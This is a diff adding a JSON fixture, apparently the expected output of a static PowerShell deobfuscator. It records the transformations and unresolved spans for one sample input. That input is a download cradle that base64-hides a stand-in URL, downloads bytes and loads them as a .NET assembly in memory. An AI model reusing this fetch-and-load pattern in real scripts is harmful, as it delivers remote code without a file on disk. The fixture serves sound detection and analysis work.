@@ -1,0 +1,237 @@
+{
+  "schema_version": "deobfuscation-v1",
+  "engine_version": "static-subset-v1",
+  "input_sha256": "6ab1afd6ca82c998c3935b92e48af9f1db0bdb906a9f3c7d387e8de4b4b42da1",
+  "source_name": "input",
+  "input_provenance": "original",
+  "status": "partial",
+  "semantic_equivalence": "not_claimed",
+  "limits": {
+    "max_input_bytes": 65536,
+    "max_artifact_bytes": 262144,
+    "max_total_artifact_bytes": 2097152,
+    "max_transformations": 512,
+    "max_depth": 3,
+    "max_expression_depth": 24,
+    "max_concat_terms": 128,
+    "max_tokens": 50000,
+    "max_work_units": 4000000,
+    "max_unresolved": 128
+  },
+  "layers": [
+    {
+      "layer_id": "L0",
+      "source_name": "input",
+      "provenance": "original",
+      "text": "$client = New-Object System.Net.WebClient\n$remote = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9wNC1tb2R1bGVzLmV4YW1wbGUuaW52YWxpZC9lbXB0eS1hc3NlbWJseS5iaW4='))\n$octets = $client.DownloadData($remote)\n$assembly = [Reflection.Assembly]::Load($octets)\n$null = $assembly.FullName\n",
+      "depth": 0,
+      "parent_transformation_id": null,
+      "root_source": null
+    }
+  ],
+  "transformations": [
+    {
+      "transformation_id": "T0001",
+      "technique": "OT-B64-INLINE",
+      "source": {
+        "layer_id": "L0",
+        "start": 84,
+        "end": 187,
+        "line": 2,
+        "column": 43,
+        "end_line": 2,
+        "end_column": 146
+      },
+      "root_source": {
+        "layer_id": "L0",
+        "start": 84,
+        "end": 187,
+        "line": 2,
+        "column": 43,
+        "end_line": 2,
+        "end_column": 146
+      },
+      "original_fragment": "[Convert]::FromBase64String('aHR0cHM6Ly9wNC1tb2R1bGVzLmV4YW1wbGUuaW52YWxpZC9lbXB0eS1hc3NlbWJseS5iaW4=')",
+      "provenance": "deobfuscator_recovered",
+      "recovery_kind": "bytes",
+      "recovered_text": null,
+      "recovered_bytes_base64": "aHR0cHM6Ly9wNC1tb2R1bGVzLmV4YW1wbGUuaW52YWxpZC9lbXB0eS1hc3NlbWJseS5iaW4=",
+      "dependencies": [],
+      "status": "partial",
+      "deterministic_verified": true,
+      "warnings": [],
+      "added_operation": null,
+      "output_layer_id": null
+    },
+    {
+      "transformation_id": "T0002",
+      "technique": "OT-B64-INLINE",
+      "source": {
+        "layer_id": "L0",
+        "start": 52,
+        "end": 188,
+        "line": 2,
+        "column": 11,
+        "end_line": 2,
+        "end_column": 147
+      },
+      "root_source": {
+        "layer_id": "L0",
+        "start": 52,
+        "end": 188,
+        "line": 2,
+        "column": 11,
+        "end_line": 2,
+        "end_column": 147
+      },
+      "original_fragment": "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9wNC1tb2R1bGVzLmV4YW1wbGUuaW52YWxpZC9lbXB0eS1hc3NlbWJseS5iaW4='))",
+      "provenance": "deobfuscator_recovered",
+      "recovery_kind": "string",
+      "recovered_text": "https://p4-modules.example.invalid/empty-assembly.bin",
+      "recovered_bytes_base64": null,
+      "dependencies": [
+        "T0001"
+      ],
+      "status": "success",
+      "deterministic_verified": true,
+      "warnings": [],
+      "added_operation": null,
+      "output_layer_id": null
+    }
+  ],
+  "unresolved": [
+    {
+      "source": {
+        "layer_id": "L0",
+        "start": 10,
+        "end": 41,
+        "line": 1,
+        "column": 11,
+        "end_line": 1,
+        "end_column": 42
+      },
+      "technique_hint": null,
+      "reason": "Only literal strings and explicitly supported expressions can be recovered.",
+      "transformation_id": null
+    },
+    {
+      "source": {
+        "layer_id": "L0",
+        "start": 0,
+        "end": 41,
+        "line": 1,
+        "column": 1,
+        "end_line": 1,
+        "end_column": 42
+      },
+      "technique_hint": "OT-VARSUB",
+      "reason": "Assignment is not a unique literal binding in the supported linear scope.",
+      "transformation_id": null
+    },
+    {
+      "source": {
+        "layer_id": "L0",
+        "start": 42,
+        "end": 188,
+        "line": 2,
+        "column": 1,
+        "end_line": 2,
+        "end_column": 147
+      },
+      "technique_hint": "OT-VARSUB",
+      "reason": "Assignment is not a unique literal binding in the supported linear scope.",
+      "transformation_id": null
+    },
+    {
+      "source": {
+        "layer_id": "L0",
+        "start": 199,
+        "end": 228,
+        "line": 3,
+        "column": 11,
+        "end_line": 3,
+        "end_column": 40
+      },
+      "technique_hint": null,
+      "reason": "Trailing syntax outside the expression subset.",
+      "transformation_id": null
+    },
+    {
+      "source": {
+        "layer_id": "L0",
+        "start": 189,
+        "end": 228,
+        "line": 3,
+        "column": 1,
+        "end_line": 3,
+        "end_column": 40
+      },
+      "technique_hint": "OT-VARSUB",
+      "reason": "Assignment is not a unique literal binding in the supported linear scope.",
+      "transformation_id": null
+    },
+    {
+      "source": {
+        "layer_id": "L0",
+        "start": 241,
+        "end": 277,
+        "line": 4,
+        "column": 13,
+        "end_line": 4,
+        "end_column": 49
+      },
+      "technique_hint": null,
+      "reason": "Static method outside the allowlist; no call performed.",
+      "transformation_id": null
+    },
+    {
+      "source": {
+        "layer_id": "L0",
+        "start": 229,
+        "end": 277,
+        "line": 4,
+        "column": 1,
+        "end_line": 4,
+        "end_column": 49
+      },
+      "technique_hint": "OT-VARSUB",
+      "reason": "Assignment is not a unique literal binding in the supported linear scope.",
+      "transformation_id": null
+    },
+    {
+      "source": {
+        "layer_id": "L0",
+        "start": 286,
+        "end": 304,
+        "line": 5,
+        "column": 9,
+        "end_line": 5,
+        "end_column": 27
+      },
+      "technique_hint": null,
+      "reason": "Trailing syntax outside the expression subset.",
+      "transformation_id": null
+    },
+    {
+      "source": {
+        "layer_id": "L0",
+        "start": 278,
+        "end": 304,
+        "line": 5,
+        "column": 1,
+        "end_line": 5,
+        "end_column": 27
+      },
+      "technique_hint": "OT-VARSUB",
+      "reason": "Assignment is not a unique literal binding in the supported linear scope.",
+      "transformation_id": null
+    }
+  ],
+  "techniques_detected": [
+    "OT-B64-INLINE"
+  ],
+  "limits_hit": [],
+  "warnings": [],
+  "work_units": 962,
+  "artifact_bytes": 364
+}
